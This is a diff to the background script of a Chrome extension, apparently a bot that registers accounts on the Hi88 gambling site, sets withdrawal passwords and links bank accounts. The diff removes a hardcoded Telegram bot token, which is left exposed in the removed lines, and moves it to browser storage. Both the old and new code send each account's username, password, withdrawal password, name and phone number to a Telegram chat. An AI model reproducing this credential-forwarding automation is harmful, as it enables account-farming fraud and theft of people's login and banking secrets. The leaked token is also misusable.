@@ -11,8 +11,46 @@ const WEBSITES = [
 ];
 
 const OCR_SERVER = "http://180.93.106.208:5588";
-const TELEGRAM_TOKEN = "8757422276:AAGEBdveh9KtnSqg9bIxu3hzDP8P_VN71PI";
-const TELEGRAM_CHAT_ID = "7651644672";
+
+// Token nhạy cảm đã được tách khỏi mã nguồn để đảm bảo bảo mật.
+// Người dùng cấu hình qua giao diện cài đặt tiện ích hoặc chrome.storage.local.
+let TELEGRAM_TOKEN = "";
+let TELEGRAM_CHAT_ID = "";
+chrome.storage?.local?.get(['telegram_token', 'telegram_chat_id'], (items) => {
+    if (items?.telegram_token) TELEGRAM_TOKEN = items.telegram_token;
+    if (items?.telegram_chat_id) TELEGRAM_CHAT_ID = items.telegram_chat_id;
+});
+if (chrome.storage?.onChanged) {
+    chrome.storage.onChanged.addListener((changes, area) => {
+        if (area === 'local') {
+            if (changes.telegram_token) TELEGRAM_TOKEN = changes.telegram_token.newValue || "";
+            if (changes.telegram_chat_id) TELEGRAM_CHAT_ID = changes.telegram_chat_id.newValue || "";
+        }
+    });
+}
+
+async function sendTelegramMessageSafely(text) {
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+        try {
+            const items = await chrome.storage?.local?.get(['telegram_token', 'telegram_chat_id']);
+            if (items?.telegram_token) TELEGRAM_TOKEN = items.telegram_token;
+            if (items?.telegram_chat_id) TELEGRAM_CHAT_ID = items.telegram_chat_id;
+        } catch (e) {}
+    }
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.warn('[Hi88 BG] Chưa cấu hình Telegram Token hoặc Chat ID. Bỏ qua gửi Telegram.');
+        return;
+    }
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+        });
+    } catch (err) {
+        console.log("[Hi88 BG] Telegram error:", err);
+    }
+}
 
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     if (request.action === "runFullSequence") {
@@ -36,11 +74,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
                 console.log("[Hi88 BG] Cài mật khẩu rút tiền thành công (chạy riêng)! Tiến hành gửi Telegram...");
                 const text = `🟢 HI88 ĐĂNG KÝ MỚI (CHẠY RIÊNG)\n👤 TK: ${request.username}\n🔑 MK: ${request.password}\n💳 MK Rút Tiền: ${request.withdrawPass}\n📝 Tên: ${request.fullname}\n📱 SĐT: ${request.phone}\n🌐 Site: ${site}`;
                 
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-                }).catch(err => console.log("[Hi88 BG] Telegram error:", err));
+                await sendTelegramMessageSafely(text);
 
                 // Đợi 6 giây để hệ thống ổn định trước khi liên kết ngân hàng
                 console.log("[Hi88 BG] Đợi 6s để hoàn thành cài mật khẩu...");
@@ -238,11 +272,7 @@ async function runFullSequence(tabId, data) {
         const withdrawPassVal = data.withdrawPass || data.password;
         const text = `🟢 HI88 ĐĂNG KÝ MỚI\n👤 TK: ${data.username}\n🔑 MK: ${data.password}\n💳 MK Rút Tiền: ${withdrawPassVal}\n📝 Tên: ${data.fullname}\n📱 SĐT: ${data.phone}\n🌐 Site: ${site}`;
         
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-        }).catch(err => console.log("[Hi88 BG] Telegram error:", err));
+        await sendTelegramMessageSafely(text);
 
         // Đợi 3 giây để hệ thống ổn định trước khi liên kết ngân hàng
         console.log("[Hi88 BG] Đợi 3s để hoàn thành cài mật khẩu...");
